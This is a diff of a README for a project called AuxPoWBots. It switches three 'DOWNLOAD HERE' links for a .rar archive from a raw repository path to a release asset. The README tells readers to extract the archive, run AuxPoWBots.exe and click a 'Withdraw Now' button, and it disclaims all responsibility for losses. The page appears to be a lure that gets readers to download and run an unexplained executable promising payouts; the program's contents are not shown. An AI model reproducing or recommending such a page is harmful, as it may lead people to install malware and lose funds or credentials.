@@ -6,7 +6,7 @@ https://raw.githubusercontent.com/AuxPoWBots/AuxPoWBots/4860d9b39d04471955d8a514
 
   Very Easy to use.
   
- [DOWNLOAD HERE](https://github.com/AuxPoWBots/AuxPoWBots/raw/master/AuxPoWBots.rar)
+ [DOWNLOAD HERE](https://github.com/AuxPoWBots/AuxPoWBots/releases/download/Unregistered/AuxPoWBots.rar)
   
   
   1) Extract & Open AuxPoWBots.exe
@@ -20,7 +20,7 @@ https://raw.githubusercontent.com/AuxPoWBots/AuxPoWBots/4860d9b39d04471955d8a514
   4) The Green Button for Withdraw Now
   
   
-  [DOWNLOAD HERE](https://github.com/AuxPoWBots/AuxPoWBots/raw/master/AuxPoWBots.rar)
+  [DOWNLOAD HERE](https://github.com/AuxPoWBots/AuxPoWBots/releases/download/Unregistered/AuxPoWBots.rar)
   
   
   
@@ -38,6 +38,6 @@ https://raw.githubusercontent.com/AuxPoWBots/AuxPoWBots/4860d9b39d04471955d8a514
   The author of this project is NOT responsible for any damage or loss caused by this software. There can be bugs and the bot may not perform as expected or specified.
 
 
-[DOWNLOAD HERE](https://github.com/AuxPoWBots/AuxPoWBots/raw/master/AuxPoWBots.rar)
+[DOWNLOAD HERE](https://github.com/AuxPoWBots/AuxPoWBots/releases/download/Unregistered/AuxPoWBots.rar)
 
 Again, thank you. AuxPoWBots :heart:
